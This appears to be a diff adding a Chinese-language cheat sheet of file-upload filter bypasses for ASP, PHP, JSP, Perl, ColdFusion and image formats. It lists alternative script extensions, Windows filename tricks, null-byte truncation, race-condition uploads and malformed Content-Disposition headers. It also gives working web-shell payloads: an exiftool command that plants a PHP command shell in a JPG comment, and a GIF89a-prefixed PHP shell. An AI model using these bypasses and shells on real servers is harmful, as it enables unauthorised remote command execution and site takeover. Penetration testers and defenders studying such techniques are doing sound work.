@@ -1,0 +1,50 @@
+asp:
+（1）HPP绕过：
+filename="1.jpg";filename="1.asp"
+
+aspx:
+
+
+php:
+（1）后缀名黑名单：
+.phtml,.phpt,.php3,.php3p
+（2）后缀黑名单 - 配合操作系统特性（Windows）：
+.php.,.php空格，.php:1.jpg,.php::$DATA等
+（3）后缀白名单：
+Happy.phpA.jpg  --》burpsuite中截断将“A” 替换为 “00” （服务端采用c/c++库解析-空字节截断）
+shell.php.jpg
+（4）条件竞争绕过：
+burpsuite-》intruder同时发两个包：上传文件+访问webshell地址：
+（5）多分号绕过：
+Content-Disposition: form-data;name="file_x";;;filename="test.php"
+(6)多个Content-Disposition绕过
+（7）超长文件名绕过（构造更多的点、符号）
+
+jsp:
+（1）后缀黑名单：
+.jspx,.jsw,.jsv,.jspf
+
+perl:
+(1)后缀黑名单：
+.pl,.pm,.cgi,.lib
+
+Coldfusion：
+（1）后缀黑名单
+.cfm,.cfml,.cfc,.dbm
+
+jpg：
+（1）图片马：
+exiftool -Comment='<?php echo"<pre>"; system($_GET['cmd']); ?>' file.jpg
+
+png:
+（1）二次渲染绕过：
+将Web shell放入PLTE块（CBC值）或IDAT块
+
+gif：
+（1）检测文件内容开始处的文件幻数（文件头）：
+GIF89a;<? system($_GET['cmd']);# shellcode goes here ?> 
+（2）二次渲染绕过：
+imagecreatefromgif（）： #php -》使用GD库进行二次渲染
+
+
+
